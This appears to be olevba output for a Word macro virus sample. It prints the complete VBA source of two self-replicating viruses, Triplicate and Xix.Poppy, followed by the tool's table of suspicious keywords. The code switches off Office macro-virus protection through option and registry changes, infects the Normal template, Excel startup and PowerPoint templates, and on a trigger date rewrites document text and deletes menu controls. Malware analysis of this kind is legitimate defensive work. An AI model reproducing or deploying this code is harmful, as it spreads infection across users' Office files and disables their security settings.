olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Triplicate.c-bf3cd9a22f6b21d6ab06c125395ad49d3890ea2f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Triplicate.c-bf3cd9a22f6b21d6ab06c125395ad49d3890ea2f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--1nternal-->
'Triplicate v0.21 /1nternal
Private Sub Document_Close()
    On Error Resume Next
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False
    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set TT = Templates(1).VBProject.VBComponents(1).CodeModule
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    If AD.Lines(1, 1) <> "'<!--1nternal-->" Then
        AD.DeleteLines 1, AD.CountofLines
        AD.InsertLines 1, TT.Lines(1, TT.CountofLines)
        If AD.Lines(1, 1) <> "'<!--1nternal-->" Then
            AD.InsertLines 1, NT.Lines(1, NT.CountofLines)
        End If
    End If
    If NT.Lines(1, 1) <> "'<!--1nternal-->" Then
        NT.DeleteLines 1, NT.CountofLines
        NT.InsertLines 1, AD.Lines(1, AD.CountofLines)
        Set xlApp = CreateObject("Excel.Application")
        If UCase(Dir(xlApp.Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Check"
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
            System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Whoa"
            Set Book1Obj = xlApp.Workbooks.Add
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NT.Lines(1, NT.CountofLines)
            Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
            Book1Obj.Close
        End If
        xlApp.Quit
        Set PPObj = CreateObject("PowerPoint.Application")
        Set PBT = PPObj.Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
        For Each ModComponent In PBT.VBProject.VBComponents
            If ModComponent.Name = "Triplicate" Then dontadd = True
        Next
        If dontadd <> True Then
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\PowerPoint\Options", "MacroVirusProtection") = ""
            System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
            Set NewMod = PBT.VBProject.VBComponents.Add(1)
            NewMod.Name = "Triplicate"
            NewMod.CodeModule.InsertLines 1, NT.Lines(1, NT.CountofLines)
            NewMod.CodeModule.ReplaceLine 118, "Sub actionhook(tristate)"
            Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
            With ShapetoWack
                .Name = "Triplicate"
                .ZOrder (1)
                .Line.Visible = False
                .Fill.Visible = False
                .ActionSettings(1).Action = 8
                .ActionSettings(1).Run = "actionhook"
            End With
            Set NewMod = Nothing
            PBT.Save
        End If
        PBT.Close
        PPObj.Quit
    End If
    If TT.Lines(1, 1) <> "'<!--1nternal-->" Then
        TT.DeleteLines 1, TT.CountofLines
        TT.InsertLines 1, NT.Lines(1, NT.CountofLines)
    End If
End Sub
Private Sub Workbook_Deactivate()
    On Error Resume Next
    Set AW = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    Set TW = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" Then
        Set WordObj = GetObject(, "Word.Application")
        If WordObj = "" Then
            Set WordObj = CreateObject("Word.Application")
            WQuit = True
        End If
        Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
        WordObj.Options.SaveNormalPrompt = False
        NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + TW.Lines(23, 3) + Chr(13) + Chr(10) + TW.Lines(38, 3) + Chr(13) + Chr(10) + "End Sub"
        WordObj.Run "Normal.ThisDocument.DisableAV"
        NT.DeleteLines 1, NT.CountofLines
        NT.InsertLines 1, TW.Lines(1, TW.CountofLines)
        Set NT = Nothing
        If WQuit = True Then WordObj.Quit
        Set PPObj = CreateObject("PowerPoint.Application")
        Set PBT = PPObj.Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
        For Each ModComponent In PBT.VBProject.VBComponents
            If ModComponent.Name = "Triplicate" Then dontadd = True
        Next
        If dontadd <> True Then
            Set NewMod = PBT.VBProject.VBComponents.Add(1)
            NewMod.Name = "Triplicate"
            NewMod.CodeModule.InsertLines 1, TW.Lines(1, TW.CountofLines)
            NewMod.CodeModule.ReplaceLine 118, "Sub actionhook(tristate)"
            Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
            With ShapetoWack
                .Name = "Triplicate"
                .ZOrder (1)
                .Line.Visible = False
                .Fill.Visible = False
                .ActionSettings(1).Action = 8
                .ActionSettings(1).Run = "actionhook"
            End With
            Set NewMod = Nothing
            PBT.Save
        End If
        PBT.Close
        PPObj.Quit
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, TW.Lines(1, TW.CountofLines)
        Book1Obj.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
        Book1Obj.Close
        xlApp.Quit
    End If
    If AW.Lines(1, 1) <> "'<!--1nternal-->" Then
        AW.InsertLines 1, TW.Lines(1, TW.CountofLines)
    End If
End Sub
Private Sub actionhook(tristate)
    On Error Resume Next
    If Int(Rnd * 7) = 0 Then
        Set Home = ActivePresentation
        If UCase(Dir(Application.Path + "\Xlstart\Book1.")) <> UCase("BOOK1") Then
            Set WordObj = GetObject(, "Word.Application")
            If WordObj = "" Then
                Set WordObj = CreateObject("Word.Application")
                WQuit = True
            End If
            Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
            WordObj.Options.SaveNormalPrompt = False
            NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(23, 3) + Chr(13) + Chr(10) + Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(38, 3) + Chr(13) + Chr(10) + "End Sub"
            WordObj.Run "Normal.ThisDocument.DisableAV"
            NT.DeleteLines 1, NT.CountofLines
            NT.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountofLines)
            NT.ReplaceLine 118, "Private Sub actionhook(tristate)"
            Set NT = Nothing
            If WQuit = True Then WordObj.Quit
            Set xlApp = CreateObject("Excel.Application")
            Set Book1Obj = xlApp.Workbooks.Add
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountofLines)
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.ReplaceLine 118, "Private Sub actionhook(tristate)"
            Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
            Book1Obj.Close
            xlApp.Quit
            Set PBT = Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
            dontadd = False
            For Each ModComponent In PBT.VBProject.VBComponents
                If ModComponent.Name = "Triplicate" Then dontadd = True
            Next
            If dontadd <> True Then
                Set NewMod = PBT.VBProject.VBComponents.Add(1)
                NewMod.Name = "Triplicate"
                NewMod.CodeModule.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountofLines)
                Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
                With ShapetoWack
                    .Name = "Triplicate"
                    .ZOrder (1)
                    .Line.Visible = False
                    .Fill.Visible = False
                    .ActionSettings(1).Action = 8
                    .ActionSettings(1).Run = "actionhook"
                End With
                PBT.Save
            End If
            PBT.Close
        End If
    End If
    ActivePresentation.SlideShowWindow.View.Next
End Sub
  RefreshTable
End Sub
-------------------------------------------------------------------------------
VBA MACRO xix.bas 
in file: Virus.MSOffice.Triplicate.c-bf3cd9a22f6b21d6ab06c125395ad49d3890ea2f - OLE stream: 'Macros/VBA/xix'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub xix()
    
    'VMPCK 1.0d w/Random Path + Update
    '=================================
    'Code Written by VicodinES
    '=================================
    'Poppy ID : 5083-QyUo94005083.c
    '=================================
    'This Virus Is: Xix.Poppy
    
On Error Resume Next
Randomize
BzUz7979 = OnLnBvVq & GjCy17022 & JvCeAiQx & VxLk11768
KrNo8852 = ReRnBxQg & UvHm12817 & LsKgBxIj & TiFo12200
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("xix").Export "c:\xix.drv"
ActiveDocument.ReadOnlyRecommended = False
NsRt = Int(Rnd * 100)
    If NsRt = 99 Then MsgBox "Dia 8 de Novembro VOTA NĂO ŕ regionalizaçăo!", vbSystemModal
MgToTvGm = VwDx2292 & LlPg10701
If Day(Now()) = 8 Then Call UmCu9400BsTy
DgCx6829 = DrGhQhNe & ExCf6570 & Int(Rnd * 2675)
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "VOTA NĂO Ŕ REGIONALIZAÇĂO! SIM AO REFORÇO DO MUNICIPALISMO!"
    .Subject = "JOĂO JARDIM x8?! PORRA! DIA 8 VOTA NĂO!"
    .Comments = "A REGIONALIZAÇĂO É UM ERRO COLOSSAL!"
    .Execute
End With
If NormalTemplate.VBProject.VBComponents.Item("xix").Name <> "xix" Then MvBv508370643 = True
PlEqIfRo = QwLq7775 & OpHg16129
If ActiveDocument.VBProject.VBComponents.Item("xix").Name <> "xix" Then TxHi70648 = True
If MvBv508370643 = True And TxHi70648 = False Then Set JxPg706450836 = NormalTemplate.VBProject.VBComponents
If MvBv508370643 = False And TxHi70648 = True Then Set JxPg706450836 = ActiveDocument.VBProject.VBComponents
JxPg706450836.import "c:\xix.drv"
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If TxHi70648 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
'VMPCK v1.0d [The Final Version?]
GoNqGpTs:
End Sub
Sub HelpAbout()
    On Error Resume Next
IqAj10564 = SgGwHmVe & KlLp7022 & PeVyEhIs & NkCo10807
    MsgBox "Joăo Jardim x8?! Porra! Dia 8 Vota NĂO!", vbInformation
End Sub
Sub AutoOpen()
    On Error Resume Next
PuIq14134 = TkEmRxTv & FyIe14577 & Int(Rnd * 8391)
    Call xix
SxLn19336 = OyOrAfGz & QtGv12202 & Int(Rnd * 9871)
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call xix
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call xix
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Call xix
ChNz19101 = EwCyLsKj & LuTw19501 & Int(Rnd * 9898)
NhAlIqVz = NhNm11382 & TqVm7492
End Sub
Sub UmCu9400BsTy()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "sim"
            .Replacement.Text = "năo ŕ regionalizaçăo!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
-------------------------------------------------------------------------------
VBA MACRO Wykres1.cls 
in file: Virus.MSOffice.Triplicate.c-bf3cd9a22f6b21d6ab06c125395ad49d3890ea2f - OLE stream: 'ObjectPool/_1127072214/_VBA_PROJECT_CUR/VBA/Wykres1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Arkusz2.cls 
in file: Virus.MSOffice.Triplicate.c-bf3cd9a22f6b21d6ab06c125395ad49d3890ea2f - OLE stream: 'ObjectPool/_1127072214/_VBA_PROJECT_CUR/VBA/Arkusz2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Arkusz3.cls 
in file: Virus.MSOffice.Triplicate.c-bf3cd9a22f6b21d6ab06c125395ad49d3890ea2f - OLE stream: 'ObjectPool/_1127072214/_VBA_PROJECT_CUR/VBA/Arkusz3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Arkusz4.cls 
in file: Virus.MSOffice.Triplicate.c-bf3cd9a22f6b21d6ab06c125395ad49d3890ea2f - OLE stream: 'ObjectPool/_1127072214/_VBA_PROJECT_CUR/VBA/Arkusz4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Triplicate.c-bf3cd9a22f6b21d6ab06c125395ad49d3890ea2f - OLE stream: 'ObjectPool/_1127072214/_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

